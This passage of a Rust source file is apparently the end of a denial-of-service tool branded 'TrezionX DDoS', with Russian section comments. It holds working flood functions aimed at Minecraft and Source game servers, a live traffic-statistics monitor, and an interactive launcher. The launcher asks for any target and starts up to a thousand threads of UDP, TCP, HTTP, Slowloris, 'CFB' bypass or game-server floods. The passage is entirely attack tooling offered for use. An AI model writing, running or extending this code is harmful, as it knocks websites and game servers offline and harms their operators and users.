            stats.failed.fetch_add(1, Ordering::Relaxed);
        }
    }
}

fn minecraft_crash(target: String, port: u16, stats: Arc<AttackStats>) {
    let addr = format!("{}:{}", target, port);
    let handshake = hex::decode("0fe0040ed3026d632e736861646f772e6e657463dd01").unwrap_or_default();
    let request = vec![0x01, 0x00];
    
    loop {
        if let Ok(mut stream) = TcpStream::connect(&addr) {
            stream.set_nodelay(true).unwrap();
            let _ = stream.write(&handshake);
            let _ = stream.write(&request);
            stats.sent.fetch_add(1, Ordering::Relaxed);
            stats.success.fetch_add(1, Ordering::Relaxed);
        } else {
            stats.failed.fetch_add(1, Ordering::Relaxed);
        }
    }
}

fn source_engine_flood(target: String, port: u16, stats: Arc<AttackStats>) {
    let addr = format!("{}:{}", target, port);
    let query = vec![0xFF, 0xFF, 0xFF, 0xFF, 0x54, 0x53, 0x6F, 0x75, 0x72, 0x63, 0x65, 0x20, 0x45, 0x6E, 0x67, 0x69, 0x6E, 0x65, 0x20, 0x51, 0x75, 0x65, 0x72, 0x79, 0x00];
    
    let socket = UdpSocket::bind("0.0.0.0:0").unwrap();
    loop {
        for _ in 0..100 {
            if socket.send_to(&query, &addr).is_ok() {
                stats.sent.fetch_add(1, Ordering::Relaxed);
                stats.success.fetch_add(1, Ordering::Relaxed);
            } else {
                stats.failed.fetch_add(1, Ordering::Relaxed);
            }
        }
    }
}

// ==================== МОНИТОР СТАТИСТИКИ ====================
fn stats_monitor(stats: Arc<AttackStats>) {
    let start = Instant::now();
    let mut last_sent = 0;
    
    print!("\r{}", " ".repeat(100));
    
    loop {
        thread::sleep(Duration::from_millis(1500));
        let sent = stats.sent.load(Ordering::Relaxed);
        let success = stats.success.load(Ordering::Relaxed);
        let failed = stats.failed.load(Ordering::Relaxed);
        let bypassed = stats.bypassed.load(Ordering::Relaxed);
        let diff = sent - last_sent;
        let elapsed = start.elapsed().as_secs().max(1);
        let gbps = (sent as f64 * 1300.0 * 8.0) / 1_000_000_000.0 / elapsed as f64;
        
        print!("\r{}[STATS] Sent: {} | Success: {} | Failed: {} | Bypassed: {} | RPS: {} | Gbps: {:.2} | Time: {}s", 
            "".color(MANSORY_COLOR), sent, success, failed, bypassed, diff, gbps, elapsed);
        io::stdout().flush().unwrap();
        last_sent = sent;
    }
}

// ==================== ГЛАВНАЯ ФУНКЦИЯ ====================
fn main() {
    print!("{}[2J", 27 as char);
    println!("{}", BANNER_FULL.color(MANSORY_COLOR));
    println!("{}", "TrezionX DDoS".color(MANSORY_COLOR).bold());
    
    let stats = Arc::new(AttackStats { 
        sent: AtomicU64::new(0), 
        success: AtomicU64::new(0), 
        failed: AtomicU64::new(0),
        bypassed: AtomicU64::new(0),
    });
    let mut attack_handles: Vec<thread::JoinHandle<()>> = vec![];
    
    // ==================== ПОШАГОВЫЙ ВВОД ====================
    print_border();
    println!("{}", "TARGET SETUP".color(MANSORY_COLOR).bold());
    print_border();
    
    // Шаг 1: Target
    print!("{}", "▶ Enter target (IP/URL): ".color(MANSORY_COLOR).bold());
    io::stdout().flush().unwrap();
    let mut target = String::new();
    io::stdin().read_line(&mut target).unwrap();
    let target = target.trim().to_string();
    
    let target_ip = if let Some(ip) = resolve_host(&target) {
        println!("{} Resolved to: {}", "✓".color(MANSORY_COLOR), ip.color(MANSORY_COLOR));
        ip
    } else {
        println!("{} Failed to resolve, using as-is", "!".color(WARNING_COLOR));
        target.replace("https://", "").replace("http://", "").replace("/", "")
    };
    
    // Шаг 2: Метод
    println!();
    println!("{}", "Available methods:".color(MANSORY_COLOR));
    println!("  L4: UDP, TCP, MIXED, RAW_UDP");
    println!("  L7: HTTP, CFB, SLOWLORIS, RAW_RPS");
    println!("  GAME: MINECRAFT, SOURCE");
    print!("{}", "▶ Enter method: ".color(MANSORY_COLOR).bold());
    io::stdout().flush().unwrap();
    let mut method = String::new();
    io::stdin().read_line(&mut method).unwrap();
    let method = method.trim().to_uppercase();
    
    // Шаг 3: Порт
    let default_port = match method.as_str() {
        "MINECRAFT" => 25565,
        "SOURCE" => 27015,
        "CFB" | "HTTP" | "RAW_RPS" | "SLOWLORIS" => 443,
        _ => 80,
    };
    print!("{}", format!("▶ Enter port (default: {}): ", default_port).color(MANSORY_COLOR).bold());
    io::stdout().flush().unwrap();
    let mut port_str = String::new();
    io::stdin().read_line(&mut port_str).unwrap();
    let port: u16 = port_str.trim().parse().unwrap_or(default_port);
    
    // Шаг 4: Потоки (только для методов где это нужно)
    let threads = if method == "RAW_RPS" {
        1000 // RAW_RPS всегда 1000 потоков
    } else {
        let default_threads = 1000;
        print!("{}", format!("▶ Enter threads (default: {}): ", default_threads).color(MANSORY_COLOR).bold());
        io::stdout().flush().unwrap();
        let mut threads_str = String::new();
        io::stdin().read_line(&mut threads_str).unwrap();
        threads_str.trim().parse().unwrap_or(default_threads)
    };
    
    if method != "RAW_RPS" {
        println!("{} Threads set to: {}", "✓".color(MANSORY_COLOR), threads);
    } else {
        println!("{} Threads: 1000 (fixed for RAW_RPS)", "✓".color(MANSORY_COLOR));
    }
    
    // Подтверждение
    println!();
    print_border();
    println!("{}", "ATTACK CONFIGURATION".color(MANSORY_COLOR).bold());
    print_border();
    println!("{} Target: {}", "▶".color(MANSORY_COLOR), target_ip);
    println!("{} Method: {}", "▶".color(MANSORY_COLOR), method);
    println!("{} Port: {}", "▶".color(MANSORY_COLOR), port);
    println!("{} Threads: {}", "▶".color(MANSORY_COLOR), threads);
    print_border();
    
    print!("{}", "Start attack? (y/N): ".color(MANSORY_COLOR).bold());
    io::stdout().flush().unwrap();
    let mut confirm = String::new();
    io::stdin().read_line(&mut confirm).unwrap();
    
    if !confirm.trim().to_lowercase().starts_with('y') {
        println!("{} Attack cancelled.", "✗".color(ERROR_COLOR));
        return;
    }
    
    // Запуск атаки
    println!();
    print_border();
    println!("{}", "▶ STARTING ATTACK".color(MANSORY_COLOR).bold());
    print_border();
    println!("{} Target: {}:{}", "▶".color(MANSORY_COLOR), target_ip, port);
    println!("{} Method: {}", "▶".color(MANSORY_COLOR), method);
    println!("{} Threads: {}", "▶".color(MANSORY_COLOR), threads);
    print_border();
    println!();
    
    let stats_clone = stats.clone();
    thread::spawn(move || stats_monitor(stats_clone));
    
    match method.as_str() {
        "UDP" => {
            for _ in 0..threads {
                let t = target_ip.clone();
                let s = stats.clone();
                attack_handles.push(thread::spawn(move || udp_flood(t, port, s)));
            }
        }
        "TCP" => {
            for _ in 0..threads {
                let t = target_ip.clone();
                let s = stats.clone();
                attack_handles.push(thread::spawn(move || tcp_flood(t, port, s)));
            }
        }
        "MIXED" => {
            for _ in 0..threads/2 {
                let t = target_ip.clone();
                let s = stats.clone();
                attack_handles.push(thread::spawn(move || udp_flood(t.clone(), port, s.clone())));
            }
            for _ in 0..threads/2 {
                let t = target_ip.clone();
                let s = stats.clone();
                attack_handles.push(thread::spawn(move || tcp_flood(t, port, s)));
            }
        }
        "RAW_UDP" => {
            for _ in 0..threads {
                let t = target_ip.clone();
                let s = stats.clone();
                attack_handles.push(thread::spawn(move || raw_udp_flood(t, port, s)));
            }
        }
        "RAW_RPS" => {
            let url = if target.starts_with("http") { target.clone() } else { format!("https://{}", target) };
            let s = stats.clone();
            attack_handles.push(thread::spawn(move || raw_rps_flood(url, s)));
        }
        "HTTP" => {
            let url = if target.starts_with("http") { target.clone() } else { format!("https://{}", target) };
            for _ in 0..threads {
                let u = url.clone();
                let s = stats.clone();
                attack_handles.push(thread::spawn(move || http_flood(u, s)));
            }
        }
        "CFB" => {
            let url = if target.starts_with("http") { target.clone() } else { format!("https://{}", target) };
            for _ in 0..threads {
                let u = url.clone();
                let s = stats.clone();
                attack_handles.push(thread::spawn(move || cfb_flood(u, s)));
            }
        }
        "SLOWLORIS" => {
            for _ in 0..threads {
                let t = target_ip.clone();
                let s = stats.clone();
                attack_handles.push(thread::spawn(move || slowloris(t, port, s)));
            }
        }
        "MINECRAFT" => {
            for _ in 0..threads {
                let t = target_ip.clone();
                let s = stats.clone();
                attack_handles.push(thread::spawn(move || minecraft_crash(t, port, s)));
            }
        }
        "SOURCE" => {
            for _ in 0..threads {
                let t = target_ip.clone();
                let s = stats.clone();
                attack_handles.push(thread::spawn(move || source_engine_flood(t, port, s)));
            }
        }
        _ => {
            println!("{} Unknown method!", "✗".color(ERROR_COLOR));
            return;
        }
    }
    
    println!("\n{} Press ENTER to stop attack...", "⏸".color(WARNING_COLOR));
    let mut stop = String::new();
    io::stdin().read_line(&mut stop).unwrap();
    
    // Остановка
    println!("{} Stopping attack...", "■".color(ERROR_COLOR));
    for h in attack_handles.drain(..) {
        h.join().ok();
    }
    
    print_border();
    println!("{}", "ATTACK FINISHED".color(MANSORY_COLOR).bold());
    print_border();
    println!("{} Total sent: {}", "▶".color(MANSORY_COLOR), stats.sent.load(Ordering::Relaxed));
    println!("{} Total success: {}", "▶".color(MANSORY_COLOR), stats.success.load(Ordering::Relaxed));
    println!("{} Total failed: {}", "▶".color(MANSORY_COLOR), stats.failed.load(Ordering::Relaxed));
    println!("{} Bypassed: {}", "▶".color(MANSORY_COLOR), stats.bypassed.load(Ordering::Relaxed));
    print_border();
}